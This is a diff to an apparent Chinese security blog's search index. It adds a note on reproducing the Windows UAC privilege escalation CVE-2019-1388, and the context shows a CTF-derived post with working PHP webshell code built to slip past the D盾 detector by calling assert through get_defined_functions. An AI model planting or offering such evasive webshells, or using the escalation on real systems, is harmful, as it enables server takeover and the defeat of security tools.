@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[CVE-2019-1388UAC提权复现]]></title>
+    <url>%2F2019%2F11%2F28%2FCVE-2019-1388UAC%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0%2F</url>
+    <content type="text"><![CDATA[漏洞简介该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。因为用户可以与该UI交互，因此对UI来说紧限制是必须的。否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作。即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC会话中含有尽可能少的点击操作选项。利用该漏洞很容易就可以提升权限到SYSTEM 漏洞影响范围Windows 2008r2 7601 link OPENED AS SYSTEMWindows 2012r2 9600 link OPENED AS SYSTEMWindows 2016 14393 link OPENED AS SYSTEMWindows 2019 17763 link NOT openedWindows 7 SP1 7601 link OPENED AS SYSTEMWindows 8 9200 link OPENED AS SYSTEMWindows 8.1 9600 link OPENED AS SYSTEMWindows 10 1511 10240 link OPENED AS SYSTEMWindows 10 1607 14393 link OPENED AS SYSTEMWindows 10 1703 15063 link NOT openedWindows 10 1709 16299 link NOT opened 漏洞复现Windows 2012 Windows 7 Windows 2008r2 工具https://github.com/jas502n/CVE-2019-1388/]]></content>
+      <categories>
+        <category>技术实战</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[过D]]></title>
     <url>%2F2019%2F11%2F26%2F%E8%BF%87D%2F</url>
     <content type="text"><![CDATA[引言在打nctf的时候,由一道ctf题目引发的过D盾的思路,主要思路用的是一个比较偏的函数get_defined_functions 过Dget_defined_functions()函数会返回一个2维数组,里面包括了所有的函数,还有自定义的函数 这里就有2个思路了一个是通过自己写的函数去执行,或者可以通过自带的函数例如assert去执行先写一个自带的函数去执行内容的代码 123&lt;?php$a=get_defined_functions();$a['internal'][850]($_GET['a']); //850是assert函数的位置 被杀了,说是变量函数,然后测试了一下发现填什么都会报这个,最后在试了一下填函数的话他只是报了个1,而且这个一级只要随便填充点垃圾数据就过去了 图片语法肯定是错的,只是想说明填函数不容易被杀。既然填函数不容易被杀,那么我们是不是可以找一个获取指定字符串在数组中位置的函数。也就是array_search这个函数 最终的代码 1234&lt;?php$a=get_defined_functions();$a['internal'][array_search('assert',$a['internal'])]($_GET['a']);?&gt;]]></content>
